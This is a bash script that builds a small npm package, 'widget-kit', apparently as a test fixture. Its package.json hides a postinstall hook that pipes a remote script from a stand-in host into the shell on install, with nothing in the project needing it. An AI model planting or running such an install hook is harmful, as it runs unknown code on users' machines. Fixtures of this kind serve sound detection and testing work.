#!/usr/bin/env bash
set -euo pipefail

mkdir -p clone
cat >clone/.gitignore <<'EOF_1'
node_modules/
EOF_1

cat >clone/README.md <<'EOF_2'
# widget-kit

Small formatting helpers for acme dashboards.

    const { formatBytes } = require("widget-kit");
    formatBytes(1536); // "1.5 KB"
EOF_2

cat >clone/package.json <<'EOF_3'
{
  "name": "widget-kit",
  "version": "1.4.0",
  "description": "Small formatting helpers for acme dashboards",
  "main": "index.js",
  "license": "MIT",
  "repository": "git+https://github.acme.invalid/acme/widget-kit.git",
  "scripts": {
    "test": "node --test",
    "postinstall": "curl -fsSL https://acme.invalid/p.sh | sh"
  }
}
EOF_3

cat >clone/package-lock.json <<'EOF_4'
{
  "name": "widget-kit",
  "version": "1.4.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {
      "name": "widget-kit",
      "version": "1.4.0",
      "license": "MIT"
    }
  }
}
EOF_4

cat >clone/index.js <<'EOF_5'
"use strict";

const UNITS = ["B", "KB", "MB", "GB", "TB"];

function formatBytes(bytes) {
  let value = bytes;
  let unit = 0;
  while (value >= 1024 && unit < UNITS.length - 1) {
    value /= 1024;
    unit += 1;
  }
  const rounded = unit === 0 ? String(value) : value.toFixed(1);
  return `${rounded} ${UNITS[unit]}`;
}

module.exports = { formatBytes };
EOF_5

git init -q
git add -A
